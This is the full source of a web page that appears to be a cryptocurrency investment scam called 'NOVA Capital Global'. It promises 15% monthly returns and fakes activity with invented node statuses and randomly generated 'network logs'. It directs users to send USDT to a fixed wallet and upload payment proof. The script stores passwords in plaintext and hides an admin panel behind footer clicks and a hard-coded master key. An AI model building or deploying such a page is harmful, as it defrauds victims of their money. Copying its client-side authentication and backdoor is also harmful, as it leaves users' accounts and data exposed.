<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NOVA | Institutional Global Infrastructure</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #0A192F; --accent: #64FFDA; --card-bg: #112240; --text-main: #CCD6F6; --text-dim: #8892B0; }
        
        body { 
            margin: 0; font-family: 'Inter', sans-serif; 
            background: var(--primary); 
            color: var(--text-main); 
            background-image: linear-gradient(rgba(10, 25, 47, 0.9), rgba(10, 25, 47, 0.9)), 
                              url('https://images.unsplash.com/photo-1639762681485-074b7f938ba0?auto=format&fit=crop&q=80&w=2000');
            background-size: cover;
            background-attachment: fixed;
        }

        .ticker { background: rgba(2, 12, 27, 0.9); color: var(--accent); padding: 8px; font-size: 11px; border-bottom: 1px solid #112240; backdrop-filter: blur(10px); }
        
        /* Auth Page */
        #auth-page { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; }
        .auth-card { background: rgba(17, 34, 64, 0.95); padding: 40px; border-radius: 12px; width: 100%; max-width: 380px; border-top: 4px solid var(--accent); backdrop-filter: blur(15px); box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
        
        /* Dashboard */
        #dashboard { display: none; padding: 30px; max-width: 1100px; margin: auto; animation: fadeIn 0.8s; }
        .node-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 10px; margin: 20px 0; }
        .node-item { background: rgba(17, 34, 64, 0.8); padding: 10px; border-radius: 6px; font-size: 11px; display: flex; justify-content: space-between; border: 1px solid #233554; }
        
        /* New Features Layout */
        .feature-row { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 20px; }
        .glass-box { background: rgba(17, 34, 64, 0.8); padding: 20px; border-radius: 12px; border: 1px solid rgba(100, 255, 218, 0.1); }

        input, select { width: 100%; padding: 12px; background: #0A192F; border: 1px solid #233554; color: white; border-radius: 4px; margin-bottom: 15px; }
        .btn-prime { width: 100%; padding: 14px; background: var(--accent); color: var(--primary); border: none; border-radius: 4px; font-weight: 800; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
        .btn-prime:hover { filter: brightness(1.2); transform: translateY(-2px); }

        /* Activity Log */
        #log-container { font-family: monospace; font-size: 10px; color: #64FFDA; height: 100px; overflow-y: hidden; }

        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        @media (max-width: 800px) { .feature-row { grid-template-columns: 1fr; } }
    </style>
</head>
<body>

    <div class="ticker">
        <marquee>GLOBAL STATUS: ACTIVE | NODES: 15/15 | SECURE ASSET TERMINAL | ENCRYPTION: AES-256-GCM</marquee>
    </div>

    <div id="auth-page">
        <div class="auth-card">
            <h2 id="auth-title" style="text-align: center; letter-spacing: 2px;">TERMINAL LOGIN</h2>
            <input type="text" id="username" placeholder="Identification">
            <input type="password" id="password" placeholder="Access Key">
            <button class="btn-prime" id="auth-btn" onclick="handleAuth()">Enter Terminal</button>
            <p style="font-size:11px; text-align:center; color:var(--text-dim); cursor:pointer;" onclick="toggleMode()" id="toggle-text">New User? Register Node</p>
        </div>
    </div>

    <div id="dashboard">
        <div style="display:flex; justify-content:space-between; align-items:center;">
            <h2 style="color:var(--accent);">NOVA OPERATIONAL INTERFACE</h2>
            <button onclick="logout()" style="background:none; border:1px solid #444; color:gray; cursor:pointer; padding:5px;">Logout</button>
        </div>

        <div class="feature-row">
            <div class="glass-box">
                <h4 style="margin-top:0; color:var(--accent);">Yield Calculator</h4>
                <p style="font-size:11px; color:var(--text-dim);">Estimate your institutional returns (Monthly 15%)</p>
                <input type="number" id="calc-amount" placeholder="Enter USDT Amount" oninput="calculate()">
                <div style="font-size:13px;">Estimated Monthly: <span id="yield-result" style="color:var(--accent); font-weight:bold;">0.00</span> USDT</div>
            </div>
            <div class="glass-box">
                <h4 style="margin-top:0; color:var(--accent);">Network Activity Logs</h4>
                <div id="log-container"></div>
            </div>
        </div>

        <h3>Infrastructure Nodes</h3>
        <div class="node-grid" id="nodeContainer"></div>

        <div class="glass-box" style="border: 1px solid var(--accent);">
            <h3 style="margin-top:0;">Institutional Funding Gateway</h3>
            <p style="font-size:12px; color:var(--text-dim);">Transfer assets to the master wallet and upload proof for activation.</p>
            <div onclick="copyWallet()" style="background:#020c1b; padding:15px; border-radius:5px; text-align:center; color:var(--accent); font-family:monospace; border:1px dashed var(--accent); cursor:pointer; margin-bottom:20px;">
                0xc270914e5a9e72C5994fb4bd9BbdD9A3425303f2
            </div>
            
            <select id="pay-method">
                <option value="USDT-BEP20">USDT (Binance Smart Chain)</option>
                <option value="USDT-ERC20">USDT (Ethereum Mainnet)</option>
                <option value="TRX-TRC20">TRON (TRC20)</option>
            </select>
            <input type="text" id="txid" placeholder="Transaction Hash (TID)">
            <input type="file" id="proofImage" accept="image/*">
            <button class="btn-prime" id="submitBtn" onclick="submitDeposit()">Submit Activation Request</button>
        </div>

        <footer id="secret-trigger" style="margin-top:40px; font-size:10px; color:gray; text-align:center;">
            &copy; 2026 NOVA CAPITAL GLOBAL | 5-S ENCRYPTION ACTIVE
        </footer>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, collection, getDocs } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo",
            authDomain: "home-94d45.firebaseapp.com",
            projectId: "home-94d45",
            appId: "1:964390949419:web:589840cb91b7e42ecd506e"
        };
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        let isLoginMode = true;

        window.toggleMode = () => {
            isLoginMode = !isLoginMode;
            document.getElementById('auth-title').innerText = isLoginMode ? "TERMINAL LOGIN" : "NODE REGISTRATION";
            document.getElementById('auth-btn').innerText = isLoginMode ? "Enter Terminal" : "Register Now";
            document.getElementById('toggle-text').innerText = isLoginMode ? "New User? Register Node" : "Back to Login";
        };

        window.handleAuth = async () => {
            const u = document.getElementById('username').value.toLowerCase().trim();
            const p = document.getElementById('password').value;
            if(!u || !p) return alert("All fields required, sweetie.");

            if(isLoginMode) {
                const snap = await getDoc(doc(db, "users", u));
                if(snap.exists() && snap.data().password === p) {
                    sessionStorage.setItem("nova_user", u);
                    location.reload();
                } else { alert("Access Denied."); }
            } else {
                await setDoc(doc(db, "users", u), { password: p, date: new Date().toISOString() });
                alert("Account secured! Login now.");
                toggleMode();
            }
        };

        window.calculate = () => {
            const amt = document.getElementById('calc-amount').value;
            document.getElementById('yield-result').innerText = (amt * 0.15).toFixed(2);
        };

        window.submitDeposit = async () => {
            const tx = document.getElementById('txid').value;
            const file = document.getElementById('proofImage').files[0];
            if(!tx || !file) return alert("Fill all fields, sweetie.");
            
            const reader = new FileReader();
            reader.onloadend = async () => {
                await setDoc(doc(db, "deposits", "tx_" + Date.now()), {
                    user: sessionStorage.getItem("nova_user"),
                    tid: tx,
                    proof: reader.result,
                    method: document.getElementById('pay-method').value,
                    date: new Date().toLocaleString()
                });
                alert("Proof Uploaded Successfully!");
                location.reload();
            };
            reader.readAsDataURL(file);
        };

        function addLog() {
            const logs = ["Node NV-Alpha synced.", "Incoming request from Singapore...", "Security handshake successful.", "Block #8821 verified.", "Encrypted session active."];
            const logBox = document.getElementById('log-container');
            const p = document.createElement('div');
            p.innerText = `> ${logs[Math.floor(Math.random()*logs.length)]}`;
            logBox.prepend(p);
            if(logBox.childNodes.length > 5) logBox.lastChild.remove();
        }

        function showDashboard() {
            document.getElementById('auth-page').style.display = 'none';
            document.getElementById('dashboard').style.display = 'block';
            setInterval(addLog, 3000);
            const nodes = ["NV-London", "NV-Tokyo", "NV-NY", "NV-SG", "NV-FRA", "NV-SYD", "NV-DXB", "NV-PAR", "NV-HK", "NV-ZRH", "V1-Core", "V2-Core", "V3-Core", "V4-Core", "V5-Core"];
            nodes.forEach(n => {
                document.getElementById('nodeContainer').innerHTML += `<div class="node-item"><span>${n}</span><span class="status-on">ONLINE</span></div>`;
            });
        }

        // SECRET ADMIN
        let adminClicks = 0;
        document.getElementById('secret-trigger').onclick = async () => {
            adminClicks++;
            if(adminClicks === 5) {
                const k = prompt("Master Key:");
                if(k === "nova_boss_786") {
                    const snap = await getDocs(collection(db, "deposits"));
                    let h = `<div style="background:#020c1b; color:white; padding:20px; font-size:12px;"><button onclick="location.reload()">Exit</button><h3>Admin Panel</h3><table border="1" style="width:100%; border-collapse:collapse;"><tr><th>User</th><th>TID</th><th>Proof</th></tr>`;
                    snap.forEach(d => {
                        const data = d.data();
                        h += `<tr><td>${data.user}</td><td>${data.tid}</td><td><img src="${data.proof}" width="100" onclick="window.open(this.src)"></td></tr>`;
                    });
                    document.body.innerHTML = h + `</table></div>`;
                }
                adminClicks = 0;
            }
        };

        window.copyWallet = () => { navigator.clipboard.writeText("0xc270914e5a9e72C5994fb4bd9BbdD9A3425303f2"); alert("Copied!"); };
        window.logout = () => { sessionStorage.clear(); location.reload(); };

        if(sessionStorage.getItem("nova_user")) showDashboard();
    </script>
</body>
</html>
